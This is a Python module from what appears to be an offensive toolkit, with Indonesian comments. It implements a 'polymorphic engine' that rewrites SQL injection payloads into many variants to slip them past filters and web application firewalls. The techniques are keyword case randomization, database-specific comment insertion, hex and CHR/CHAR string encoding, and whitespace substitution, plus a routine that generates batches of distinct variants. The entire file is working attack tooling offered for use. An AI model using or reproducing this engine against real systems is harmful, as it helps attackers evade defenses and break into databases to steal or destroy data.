# attack/polymorphic.py
# FIXED: BUG-1 duplicate WHITESPACE_SUBS removed
# FIXED: BUG-4 PostgreSQL CHR() syntax corrected
import re
import random
from typing import Dict, List

class PolymorphicEngine:
    """
    Mengubah payload SQL menjadi varian yang semantically equivalent
    tapi syntactically berbeda setiap kali dipanggil.
    """

    SQL_KEYWORDS = [
        "SELECT", "UNION", "FROM", "WHERE", "AND", "OR", "NOT", "IN",
        "IS", "NULL", "INSERT", "UPDATE", "DELETE", "DROP", "TABLE",
        "DATABASE", "ORDER", "BY", "GROUP", "HAVING", "LIMIT", "OFFSET",
        "SLEEP", "BENCHMARK", "CONCAT", "SUBSTRING", "ASCII", "CHAR",
        "HEX", "UNHEX", "CONVERT", "CAST", "INFORMATION_SCHEMA",
    ]

    DB_COMMENT_STYLES: Dict[str, List[str]] = {
        "mysql":      ["/**/", "/*!*/", "/*!50000*/", "-- -"],
        "mssql":      ["/**/", "-- -", "/*comment*/"],
        "postgresql": ["/**/", "-- -", "/*pg*/"],
        "oracle":     ["/**/", "-- -"],
        "generic":    ["/**/", "/**_**/", "/*x*/"],
    }

    # FIXED: Defined once (not duplicated like line 773)
    WHITESPACE_SUBS = ["\t", "\n", "/**/", "%09", "%0a"]

    @staticmethod
    def mutate_case(payload: str) -> str:
        result = payload
        for kw in PolymorphicEngine.SQL_KEYWORDS:
            pattern = re.compile(re.escape(kw), re.IGNORECASE)
            def randomize(m):
                return "".join(
                    c.upper() if random.random() > 0.5 else c.lower()
                    for c in m.group(0)
                )
            result = pattern.sub(randomize, result)
        return result

    @staticmethod
    def inject_comments(payload: str, db_type: str = "generic") -> str:
        styles  = PolymorphicEngine.DB_COMMENT_STYLES.get(
            db_type.lower(), PolymorphicEngine.DB_COMMENT_STYLES["generic"]
        )
        result  = payload

        for kw in PolymorphicEngine.SQL_KEYWORDS:
            pattern = re.compile(r"(?<!\w)" + re.escape(kw) + r"(?!\w)", re.IGNORECASE)
            def insert_comment(m):
                if random.random() < 0.6:
                    cmt = random.choice(styles)
                    mid = len(m.group(0)) // 2
                    return m.group(0)[:mid] + cmt + m.group(0)[mid:]
                return m.group(0)
            result = pattern.sub(insert_comment, result)
        return result

    @staticmethod
    def encode_strings(payload: str, db_type: str = "mysql") -> str:
        """
        FIXED: PostgreSQL CHR() syntax corrected untuk multiple chars.
        MySQL: 0x hex literal
        PostgreSQL: CHR(65)||CHR(66) untuk concat multiple
        MSSQL: CHAR(65)+CHAR(66)
        """
        def encode_match(m: re.Match) -> str:
            s = m.group(1)
            if not s:
                return m.group(0)

            if db_type.lower() in ("mysql", "sqlite"):
                hex_val = s.encode().hex()
                return f"0x{hex_val}"

            elif db_type.lower() == "postgresql":
                # FIXED: Correct PostgreSQL syntax with CONCAT operator ||
                chars = "||".join(f"CHR({ord(c)})" for c in s)
                return f"({chars})"

            elif db_type.lower() == "mssql":
                chars = "+".join(f"CHAR({ord(c)})" for c in s)
                return f"({chars})"

            else:  # Oracle
                chars = "||".join(f"CHR({ord(c)})" for c in s)
                return f"({chars})"

        pattern = re.compile(r"'([^']{2,})'")
        return pattern.sub(encode_match, payload)

    @staticmethod
    def substitute_whitespace(payload: str) -> str:
        subs   = PolymorphicEngine.WHITESPACE_SUBS
        result = list(payload)
        for i, ch in enumerate(result):
            if ch == " " and random.random() < 0.4:
                result[i] = random.choice(subs)
        return "".join(result)

    @classmethod
    def obfuscate(
        cls,
        payload:    str,
        db_type:    str  = "generic",
        encode_str: bool = False,
        level:      int  = 2,
    ) -> str:
        """Entry point — apply semua teknik sesuai level."""
        result = payload
        result = cls.mutate_case(result)

        if level >= 2:
            result = cls.inject_comments(result, db_type)

        if level >= 3:
            if encode_str:
                result = cls.encode_strings(result, db_type)
            result = cls.substitute_whitespace(result)

        return result

    @classmethod
    def generate_variants(cls, payload: str, db_type: str = "generic",
                          count: int = 5) -> List[str]:
        seen     = {payload}
        variants = [payload]
        attempts = 0

        while len(variants) < count and attempts < count * 10:
            v = cls.obfuscate(payload, db_type, level=random.randint(1, 3))
            if v not in seen:
                seen.add(v)
                variants.append(v)
            attempts += 1

        return variants
